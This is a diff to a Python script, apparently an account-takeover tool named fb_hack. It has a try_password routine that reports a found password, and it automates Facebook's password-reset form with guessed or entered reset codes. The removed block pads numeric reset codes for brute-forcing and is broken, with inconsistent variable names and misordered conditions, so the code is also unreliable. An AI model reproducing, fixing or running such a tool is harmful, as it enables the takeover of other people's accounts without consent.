@@ -45,39 +45,6 @@ def try_password(self, email, password):
         print ('Password found: %s' % password )
         sys.exit()
 
-    if reset1 < 10000000:
-      h = ""
-      code = ("0", str(y))
-      yo = h.join(code)
-    elif reset1 < 1000000:
-      h = ""
-      code = ("00", str(y))
-      yo = h.join(code)
-    elif reset1 < 100000:
-      h = ""
-      code = ("000", str(y))
-      y0 = h.join(code)
-    elif reset1 < 10000:
-      h = ""
-      code = ("0000", str(y))
-      y0 = h.join(code)
-    elif reset1 < 1000:
-      h = ""
-      code = ("00000", str(y))
-      y0 = h.join(code)
-    elif reset1 < 100:
-      h = ""
-      code = ("000000", str(y))
-      y0 = h.join(code)
-    elif reset < 10:
-      h = ""
-      code = ("00000000", str(y))
-      y0 = h.join(code)
-    elif reset < 0:
-      reset = 99999999
-    else:
-      yo = str(reset)
-
 def fb_hack():
   os.system('clear')
   soup = BeautifulSoup()
@@ -102,7 +69,6 @@ def fb_hack():
   browser.submit()
   """reset code input"""
   browser.select_form(nr=0)
-  reset = input('Code: ')
   browser.form['n'] = reset
   browser.submit()
   reset = 999999
@@ -115,7 +81,7 @@ def fb_hack():
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   if check1 != test:
     print(check1)
-    reset = 999999
+    reset = input('Code:') or 999999
   else:
     print(check2)
     reset = 99999999
